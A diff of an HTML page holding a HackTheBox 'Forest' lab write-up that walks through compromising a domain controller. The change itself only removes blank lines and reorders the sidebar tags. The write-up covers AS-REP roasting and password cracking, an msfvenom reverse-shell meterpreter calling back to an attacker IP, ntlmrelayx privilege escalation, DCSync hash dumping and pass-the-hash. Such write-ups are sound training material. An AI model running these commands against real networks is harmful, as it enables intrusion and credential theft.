@@ -153,7 +153,6 @@ gather several informations about the box:</p>
 <span class="code-line"># Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We use <code>getArch.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>
 to determine the machine Architecture, the machine is 64-bits.</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>python getArch.py -target 10.10.10.161</span>
@@ -163,7 +162,6 @@ to determine the machine Architecture, the machine is 64-bits.</p>
 <span class="code-line">[*] Socket connect timeout set to 2 secs</span>
 <span class="code-line">10.10.10.161 is 64-bi</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We check the open ports using <a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html">a useful website</a></p>
 <h2 id="port-88-kerberos">Port 88: Kerberos</h2>
@@ -232,7 +230,6 @@ Controller, every "local" user is a domain user.</p>
 <span class="code-line">[*] Auxiliary module execution completed</span>
 <span class="code-line"></code></pre></div>
 
-
 <h2 id="getting-npusers">Getting NPUsers</h2>
 <p><code>UF_DONT_REQUIRE_PREAUTH</code></p>
 <blockquote>
@@ -248,7 +245,6 @@ Controller, every "local" user is a domain user.</p>
 <span class="code-line">santi</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>In order to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>
 we need to add an entry in our <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/hosts</span>
@@ -257,7 +253,6 @@ we need to add an entry in our <code>/etc/hosts</code>.</p>
 <span class="code-line">10.10.10.161    htb.local</span>
 <span class="code-line">10.10.10.161    forest.htb.local</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>And we launch <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>.</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john</span>
@@ -271,7 +266,6 @@ we need to add an entry in our <code>/etc/hosts</code>.</p>
 <span class="code-line">[-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
 <span class="code-line">[-] invalid principal syntax</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We crack the password using john and the rockyou dictionary. The user's
 password is "s3rvice".</p>
@@ -288,7 +282,6 @@ password is "s3rvice".</p>
 <span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
 <span class="code-line">Session completed</span>
 <span class="code-line"></code></pre></div>
-
 
 <h2 id="ms14-068">MS14-068</h2>
 <p>In order to run MS14-068 we need the SUID of our user. We enumerate them using
@@ -339,14 +332,12 @@ SID-User RID).</p>
 <span class="code-line">[*] 10.10.10.161:445      - USER=santi RID=1152</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We can also try to get Users SPNs</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice</span>
 <span class="code-line">Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies</span>
 <span class="code-line"></span>
 <span class="code-line">No entries found</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We add the DC to our <code>/etc/resolv.conf</code> and install <code>rdate</code> to have the same
 time as the DC.</p>
@@ -363,14 +354,12 @@ time as the DC.</p>
 <span class="code-line">Thu Oct 24 16:22:14 CEST 2019</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>I know have the same time as the DC (this is super important for tickets
 generation).</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>date &amp;&amp; rdate -n htb.local</span>
 <span class="code-line">Thu 24 Oct 2019 04:24:55 PM CEST</span>
 <span class="code-line">Thu Oct 24 16:24:55 CEST 2019</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>The exploitation of MS14-068 does not work.</p>
 <h2 id="evil-winrm">Evil-winrm</h2>
@@ -445,7 +434,6 @@ to connect to the system and get user's flag:</p>
 <span class="code-line">e5e4e&lt;redacted&gt;</span>
 <span class="code-line"></code></pre></div>
 
-
 <h1 id="getting-root">Getting root</h1>
 <h2 id="evil-winrm-and-binary">evil-winrm and binary</h2>
 <p>Using evil-Winrm we can also check the domain SID (and our user SID):</p>
@@ -457,7 +445,6 @@ to connect to the system and get user's flag:</p>
 <span class="code-line">================ =============================================</span>
 <span class="code-line">htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>Using evil-winrm we can easily upload a binary using the <code>upload</code> function.
 Nevertheless I was not able to invoke the binary using the <code>Invoke-binary</code>
@@ -486,11 +473,9 @@ msfvenom meterprter:</p>
 <span class="code-line"><span class="k">end</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <p>The msfvenom command to generate the meterpreter is the following:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&quot;10.10.15.185&quot; LPORT=4444 -f exe &gt; shell.exe</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>To catch the reverse meterpreter we use the <code>exploit/multi/handler</code> metasploit
 module. We can get a cmd shell using the <code>shell</code> command.</p>
@@ -535,7 +520,6 @@ resolution probably because of our VPN configuration.</p>
 <span class="code-line">dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds</span>
 <span class="code-line"></code></pre></div>
 
-
 <p>We edit the code of <code>/root/BloodHound.py/bloodhound/ad/domain.py</code>:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">def</span> <span class="nf">ldap_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s1">&#39;ldap&#39;</span><span class="p">,</span> <span class="n">resolver</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span></span>
 <span class="code-line">        <span class="sd">&quot;&quot;&quot;</span></span>
@@ -551,12 +535,10 @@ resolution probably because of our VPN configuration.</p>
 <span class="code-line">        <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;10.10.10.161&quot;</span></span>
 <span class="code-line"></code></pre></div>
 
-
 <p>The ingestor create a few JSON files:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code>ls *.json</span>
 <span class="code-line">computers.json  domains.json  groups.json  sessions.json  users.json</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We start the <code>neo4j</code> database, <code>bloodhound</code> and feed him the JSON data.</p>
 <p>When using the query "Shortest Paths to High Value Targets" we get the following
@@ -596,7 +578,6 @@ For more information about the Active Directory Right:
 <span class="code-line">net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot; created_01 /add</span>
 <span class="code-line">The command completed successfully.</span>
 <span class="code-line"></code></pre></div>
-
 
 <p>We then launch <a href="https://github.com/SecureAuthCorp/impacket/">impacket's ntlmrelayx.py</a>
 with the <code>escalate-user</code> parameter. We try it by authenticating in our browser on 127.0.0.1.</p>
@@ -643,7 +624,6 @@ with the <code>escalate-user</code> parameter. We try it by authenticating in ou
 <span class="code-line">[-] ACL attack already performed. Refusing to continue</span>
 <span class="code-line"></code></pre></div>
 
-
 <h2 id="dcsync">DCSync</h2>
 <p>Our right where sufficient to escalate to get the <code>Replication-Get-Changes-All</code>
 privileges on the domain. As mention by <code>ntlmrelayx</code> we can now use a
@@ -672,7 +652,6 @@ the users' passwords hashes.</p>
 <span class="code-line">htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
 <span class="code-line">&lt;SNIP&gt;</span>
 <span class="code-line"></code></pre></div>
-
 
 <h2 id="pth">PTH</h2>
 <p>We can then use the <a href="http://blog.gentilkiwi.com/tag/pass-the-hash">Path the hash</a>
@@ -705,7 +684,6 @@ the Domain Controller as administrator and get the flag.</p>
 <span class="code-line">C:\Users\Administrator\Desktop&gt;type root.txt</span>
 <span class="code-line">f04815&lt;redacted&gt;</span>
 <span class="code-line"></code></pre></div>
-
 
 <h1 id="wrapping-up">Wrapping up</h1>
 <p>What a journey. This box was classified as easy but probably needed a medium
@@ -793,116 +771,203 @@ outside of client environments.</p>
     <h3 class="title module-title">Tags</h3>
 
     <ul>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">Linux</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+            </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
             </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/memcache.html">memcache</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/phs.html">PHS</a>
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vb.html">VB</a>
+              <a href="https://maggick.fr/tag/server.html">server</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/restic.html">restic</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
               <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/docker.html">docker</a>
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/linux.html">Linux</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/upload.html">Upload</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+              <a href="https://maggick.fr/tag/phs.html">PHS</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/web.html">web</a>
             </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/ssl.html">SSL</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
+              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/bypass.html">bypass</a>
@@ -910,173 +975,92 @@ outside of client environments.</p>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/webmin.html">webmin</a>
             </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
             <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/waf.html">WAF</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
             </li>
             <li class="tag tag-2">
               <a href="https://maggick.fr/tag/windows.html">Windows</a>
             </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openemr.html">openEMR</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">CVE</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/nano.html">nano</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/redis.html">redis</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/net.html">.NET</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/blog.html">blog</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/azure.html">Azure</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/xss.html">XSS</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/smb.html">SMB</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/impacket.html">impacket</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/re.html">RE</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/pth.html">PTH</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/dll.html">DLL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-2">
               <a href="https://maggick.fr/tag/misc.html">misc</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
     </ul>
 </section>
